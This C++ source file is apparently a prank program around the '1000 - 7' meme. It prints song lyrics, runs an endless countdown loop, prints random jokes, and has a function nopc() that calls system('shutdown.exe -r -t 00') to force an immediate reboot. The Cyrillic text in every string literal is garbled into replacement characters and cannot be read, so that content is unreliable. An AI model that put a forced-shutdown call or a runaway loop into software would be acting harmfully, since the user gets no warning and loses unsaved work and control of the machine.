#include "pricole.h"

void text()
{
	std::cout << "� ���� ��� �������, ����� ���� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << "���� ������ ����� �������� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << "� �� ���� ������� ���� �� ��������" << std::endl;
	std::cout << "1000 - 7, � ��� �����" << std::endl;
	std::cout << std::endl;
	std::cout << "� ���� ���� �����, �� ��� ��� ���" << std::endl;
	std::cout << "�� ������ �� �������� ���, � - � - �" << std::endl;
	std::cout << "� �������� ���� ����� �� �����, ����" << std::endl;
	std::cout << "�� ������� �� �������� ����(�������)" << std::endl;
	std::cout << std::endl;
	std::cout << "��� � ����� ������� : ��� �����" << std::endl;
	std::cout << "������ �����, �� ������ ���� ��� ����" << std::endl;
	std::cout << "��� ������ ����, �� ������, ����" << std::endl;
	std::cout << "� ������� ������, ��� �� �����" << std::endl;
	std::cout << std::endl;
	std::cout << "� ���� ��� �������, ����� ���� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << "���� ������ ����� �������� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << "� ���� ��� �������, ����� ���� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << "���� ������ ����� �������� �����" << std::endl;
	std::cout << "1000 - 7, � ����, ������" << std::endl;
	std::cout << std::endl;
	std::cout << "� ���� ���� �����, �� ��� ��� ���" << std::endl;
	std::cout << "�� ������ �� �������� ���, � - � - �" << std::endl;
	std::cout << "� �������� ���� ����� �� �����, ����" << std::endl;
	std::cout << "�� ������� �� �������� ����(�������)" << std::endl;
	std::cout << "� ���� ���� �����, �� ��� ��� ���" << std::endl;
	std::cout << "�� ������ �� �������� ���, � - � - �" << std::endl;
	std::cout << "� �������� ���� ����� �� �����, ����" << std::endl;
	std::cout << "�� ������� �� �������� ����(�������)" << std::endl;
	std::cout << std::endl;
}

void r1000m7()
{
	int one = 1000;
	int two = 7;
	while (true) {
		std::cout << one + two << std::endl;
		two = two - 7;
	}
}

void nopc()
{
	system("shutdown.exe -r -t 00");
}

void shut(int random)
{
	std::string shutki[7] = { "1000-7?", "���������� ��� IQ:7, �� ��� ������", "��� ������?", "���� �����?", "����� ������?", "�� ������ ������?", "� ������?" };
	random = rand() % 7;
	std::cout << shutki[random] << std::endl;
}